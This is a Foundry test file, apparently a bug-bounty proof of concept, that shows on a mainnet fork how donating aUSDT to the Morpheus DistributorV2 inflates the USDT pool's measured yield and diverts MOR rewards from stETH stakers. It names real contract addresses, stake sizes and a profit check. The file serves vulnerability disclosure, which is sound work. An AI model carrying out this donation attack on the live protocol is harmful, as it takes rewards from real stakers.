// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/// @notice Tether USDT's approve/transfer return NO value (0-byte returndata, verified
///         on the fork). Declaring them as returning bool makes the caller revert on
///         ABI-decoding the empty returndata. Use this no-return interface for USDT.
interface IUSDT {
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function getDistributedRewards(uint256 rewardPoolIndex_, address depositPoolAddress_)
        external
        view
        returns (uint256);
    function depositPools(uint256 rewardPoolIndex_, address depositPoolAddress_)
        external
        view
        returns (
            address token,
            string memory chainLinkPath,
            uint256 tokenPrice,
            uint256 deposited,
            uint256 lastUnderlyingBalance,
            uint8 strategy,
            address aToken,
            bool isExist
        );
    function rewardPoolLastCalculatedTimestamp(uint256 rewardPoolIndex_) external view returns (uint128);
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function rewardPoolsData(uint256 rewardPoolIndex_)
        external
        view
        returns (uint128 lastUpdate, uint256 rate, uint256 totalVirtualDeposited);
    function usersData(address user_, uint256 rewardPoolIndex_)
        external
        view
        returns (
            uint128 lastStake,
            uint256 deposited,
            uint256 rate,
            uint256 pendingRewards,
            uint128 claimLockStart,
            uint128 claimLockEnd,
            uint256 virtualDeposited,
            uint128 lastClaim,
            address referrer
        );
}

interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

interface IAaveProvider {
    function getPool() external view returns (address);
}

interface IRewardPool {
    function getPeriodRewards(uint256 index_, uint128 startTime_, uint128 endTime_) external view returns (uint256);
}

interface IAggregator {
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}

/// @title DistributorV2 aToken-donation yield inflation — Morpheus bug bounty PoC
/// @notice Fork PoC pinned to Ethereum block 26434871 (0x1935d37, 2026-11-17).
///         Target: Distributor 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A (Appendix A).
/// @notice Run: forge test
///         (uses https://eth.drpc.org by default; override with ETH_RPC_URL)
/// @notice The attack: for AAVE-strategy pools DistributorV2 measures yield as the
///         Distributor's aToken balance minus the pool's lastUnderlyingBalance.
///         Anyone can donate aTokens to the Distributor, which inflates that pool's
///         measured yield for the next distribution, diverting MOR emissions toward
///         the attacker's pool. The isDepositTokenAdded guard (public issue #64's
///         fix) does not cover external donations: no second pool is needed.
/// @notice Harness notes (all documented, none change the target):
///         - Chainlink feeds are mocked to return their pinned-block answers with a
///           fresh updatedAt after the warp. On mainnet the feeds update on schedule;
///           the mock only simulates that normal background behaviour across the
///           warped day. The attack does not depend on oracle behaviour.
///         - One day of yield is simulated across the warped day exactly as mainnet
///           produces it: Aave interest via real reserve index updates (tiny supplies
///           to each reserve), and the Lido stETH rebase via a 0.34 stETH transfer
///           from the wstETH contract (mean of the two most recently observed daily
///           rebases: 0.236 on 16 Nov, 0.440 on 17 Nov 2026). The wstETH prank only
///           simulates background yield; it is not an attacker capability and
///           wstETH is not a Morpheus privileged account.
///         - No privileged Morpheus accounts are used anywhere in this PoC.
///         - MOR is valued at $0.7058 (DexScreener best-liquidity pair, 17 Nov 2026).
contract DistributorV2Donation is Test {
    uint256 constant FORK_BLOCK = 26434871;
    uint256 constant T0 = 1794919775; // pinned block timestamp (verified: cast block 26434871)
    uint256 constant DAY = 86400;

    IDistributor constant DISTRIBUTOR = IDistributor(0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A);
    IDepositPool constant USDT_POOL = IDepositPool(0x3B51989212BEdaB926794D6bf8e9E991218cf116);
    IDepositPool constant STETH_POOL = IDepositPool(0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790);
    IRewardPool constant REWARD_POOL = IRewardPool(0xb7994dE339AEe515C9b2792831CD83f3C9D8df87);

    IUSDT constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 constant AUSDT = IERC20(0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a);
    IERC20 constant STETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    address constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0; // large stETH holder
    IAaveProvider constant AAVE_PROVIDER =
        IAaveProvider(0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e);

    // Chainlink feeds (pinned-block latestRoundData values, read at block 26434871).
    address constant FEED_STETH_USD = 0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8;
    address constant FEED_WBTC_BTC = 0xfdFD9C85aD200c506Cf9e21F1FD8dd01932FBB23;
    address constant FEED_BTC_USD = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c;
    address constant FEED_ETH_USD = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address constant FEED_USDC_USD = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;
    address constant FEED_USDT_USD = 0x3E7d1eAB13ad0104d2750B8863b489D65364e32D;

    uint256 constant STAKE_USDT = 147_000e6; // ~80% of USDT pool virtual deposits (1x, no lock)
    uint256 constant DONATION_USDT = 367e6; // aUSDT donation, near-optimal for the measured yield
    uint256 constant REBASE_STETH = 0.34 ether; // simulated one-day Lido rebase (see header)
    uint256 constant MOR_USD_1E4 = 7058; // $0.7058, 4 decimals

    address attacker;
    address helper;

    function setUp() public {
        vm.createSelectFork(vm.envOr("ETH_RPC_URL", string("https://eth.drpc.org")), FORK_BLOCK);
        vm.warp(T0);
        attacker = makeAddr("attacker");
        helper = makeAddr("helper");
        deal(address(USDT), attacker, 1_000_000e6);
        deal(address(USDT), helper, 1_000e6);
        deal(address(USDC), helper, 1_000e6);
        deal(address(WETH), helper, 1 ether);
        deal(address(WBTC), helper, 0.01e8);
        vm.deal(attacker, 10 ether);
        vm.deal(helper, 10 ether);
    }

    /// @notice Mock every feed to return its pinned-block answer with a fresh updatedAt,
    ///         simulating normal Chainlink updates across the warped day.
    function _mockFeedsFresh(uint256 freshUpdatedAt) internal {
        _mockFeed(FEED_STETH_USD, 36893488147419126914, 181383353202, 1794917900, freshUpdatedAt);
        _mockFeed(FEED_WBTC_BTC, 36893488147419104095, 100074355, 1794865012, freshUpdatedAt);
        _mockFeed(FEED_BTC_USD, 129127208515966887485, 6485484500000, 1794919739, freshUpdatedAt);
        _mockFeed(FEED_ETH_USD, 129127208515966897223, 182297506215, 1794919366, freshUpdatedAt);
        _mockFeed(FEED_USDC_USD, 73786976294838206531, 99979041, 1794869723, freshUpdatedAt);
        _mockFeed(FEED_USDT_USD, 73786976294838206528, 99900254, 1794840737, freshUpdatedAt);
    }

    function _mockFeed(address feed, uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt)
        internal
    {
        vm.mockCall(
            feed,
            abi.encodeWithSelector(IAggregator.latestRoundData.selector),
            abi.encode(roundId, answer, startedAt, updatedAt, roundId)
        );
    }

    /// @notice Simulate one day of real yield at the warped timestamp: Aave interest via
    ///         real reserve index updates, plus the Lido stETH rebase as a balance increase.
    function _simulateOneDayOfYield(uint256 rebaseAmount) internal {
        IAavePool pool = IAavePool(AAVE_PROVIDER.getPool());
        vm.startPrank(helper);
        WETH.approve(address(pool), 0.001 ether);
        pool.supply(address(WETH), 0.001 ether, helper, 0);
        WBTC.approve(address(pool), 1000);
        pool.supply(address(WBTC), 1000, helper, 0);
        USDC.approve(address(pool), 1e6);
        pool.supply(address(USDC), 1e6, helper, 0);
        USDT.approve(address(pool), 1e6);
        pool.supply(address(USDT), 1e6, helper, 0);
        vm.stopPrank();
        // Lido rebase: every stETH balance grows; the Distributor's share is ~0.34 stETH/day.
        vm.prank(WSTETH);
        STETH.transfer(address(DISTRIBUTOR), rebaseAmount);
    }

    function _attackerStake() internal {
        vm.startPrank(attacker);
        USDT.approve(address(DISTRIBUTOR), type(uint256).max);
        USDT_POOL.stake(0, STAKE_USDT, 0, address(0));
        vm.stopPrank();
    }

    function _attackerDonateAUSDT() internal returns (uint256 donated) {
        IAavePool pool = IAavePool(AAVE_PROVIDER.getPool());
        vm.startPrank(attacker);
        USDT.approve(address(pool), DONATION_USDT);
        pool.supply(address(USDT), DONATION_USDT, attacker, 0);
        donated = AUSDT.balanceOf(attacker);
        AUSDT.transfer(address(DISTRIBUTOR), donated);
        vm.stopPrank();
    }

    function _runOneDay(bool donate, uint256 rebaseAmount)
        internal
        returns (uint256 attackerPending, uint256 usdtDelta, uint256 stethDelta, uint256 tranche)
    {
        if (donate) {
            uint256 donated = _attackerDonateAUSDT();
            console.log("donated aUSDT (raw 6dp):", donated);
        }
        uint256 warpTarget = T0 + DAY + 1;
        _mockFeedsFresh(warpTarget);
        vm.warp(warpTarget);
        _simulateOneDayOfYield(rebaseAmount);

        uint256 usdtBefore = DISTRIBUTOR.getDistributedRewards(0, address(USDT_POOL));
        uint256 stethBefore = DISTRIBUTOR.getDistributedRewards(0, address(STETH_POOL));
        uint128 lastCalc = DISTRIBUTOR.rewardPoolLastCalculatedTimestamp(0);
        tranche = REWARD_POOL.getPeriodRewards(0, lastCalc, uint128(block.timestamp));

        DISTRIBUTOR.distributeRewards(0);

        usdtDelta = DISTRIBUTOR.getDistributedRewards(0, address(USDT_POOL)) - usdtBefore;
        stethDelta = DISTRIBUTOR.getDistributedRewards(0, address(STETH_POOL)) - stethBefore;
        attackerPending = USDT_POOL.getLatestUserReward(0, attacker);
    }

    function testDonationInflatesYieldShare() public {
        // Common prefix: attacker stakes (this triggers distribution #1 for the
        // 24.67h pending tranche, 88,800s; the attacker earns 0 of it, they stake after it).
        _attackerStake();
        (,,,,,, uint256 attackerVirtual,,) = USDT_POOL.usersData(attacker, 0);
        (,, uint256 totalVirtual) = USDT_POOL.rewardPoolsData(0);
        uint256 shareBps = (attackerVirtual * 10_000) / totalVirtual;
        console.log("attacker USDT pool share (bps):", shareBps);
        assertGe(shareBps, 7900, "attacker must dominate the USDT pool");

        uint256 snap = vm.snapshot();

        // Attack branch: donate aUSDT, warp a day, distribute.
        (uint256 attackPending, uint256 attackUsdt, uint256 attackSteth, uint256 tranche) =
            _runOneDay(true, REBASE_STETH);
        console.log("tranche MOR:", tranche / 1e18);
        console.log("ATTACK usdtDelta MOR:", attackUsdt / 1e18);
        console.log("ATTACK stethDelta MOR:", attackSteth / 1e18);
        console.log("ATTACK attackerPending MOR:", attackPending / 1e18);

        vm.revertTo(snap);

        // Control branch: identical, no donation.
        (uint256 controlPending, uint256 controlUsdt, uint256 controlSteth,) = _runOneDay(false, REBASE_STETH);
        console.log("CONTROL usdtDelta MOR:", controlUsdt / 1e18);
        console.log("CONTROL stethDelta MOR:", controlSteth / 1e18);
        console.log("CONTROL attackerPending MOR:", controlPending / 1e18);

        // The donation costs DONATION_USDT ($367). In MOR at $0.7058 that is ~520 MOR.
        uint256 donationCostMOR = (DONATION_USDT * 1e18 * 10_000) / (1e6 * MOR_USD_1E4);
        uint256 incrementalGain = attackPending - controlPending;
        console.log("donation cost in MOR:", donationCostMOR / 1e18);
        console.log("incremental attacker gain MOR:", incrementalGain / 1e18);

        // Core assertions: the donation buys more MOR than it costs, the USDT pool's
        // share jumps, and the stETH stakers' share falls.
        assertGt(incrementalGain, donationCostMOR, "donation must be net profitable in MOR");
        assertGt(attackUsdt, controlUsdt * 5, "USDT pool share must jump with the donation");
        assertLt(attackSteth, controlSteth, "stETH stakers must lose share to the donation");
        assertGt(attackPending, 500e18, "attacker must capture a material MOR amount");
    }

    /// @notice Robustness: the donation stays net profitable even at the top of the
    ///         observed daily rebase range (0.44 stETH, 17 Nov 2026), i.e. when natural
    ///         yield is at its highest and the donation's share is at its lowest.
    function testDonationProfitableAtHighRebase() public {
        _attackerStake();
        uint256 snap = vm.snapshot();
        (uint256 attackPending,,,) = _runOneDay(true, 0.44 ether);
        vm.revertTo(snap);
        (uint256 controlPending,,,) = _runOneDay(false, 0.44 ether);
        uint256 donationCostMOR = (DONATION_USDT * 1e18 * 10_000) / (1e6 * MOR_USD_1E4);
        uint256 incrementalGain = attackPending - controlPending;
        console.log("HIGH-REBASE attackPending MOR:", attackPending / 1e18);
        console.log("HIGH-REBASE controlPending MOR:", controlPending / 1e18);
        console.log("HIGH-REBASE incremental gain MOR:", incrementalGain / 1e18);
        assertGt(incrementalGain, donationCostMOR, "donation must stay profitable at high rebase");
    }

}
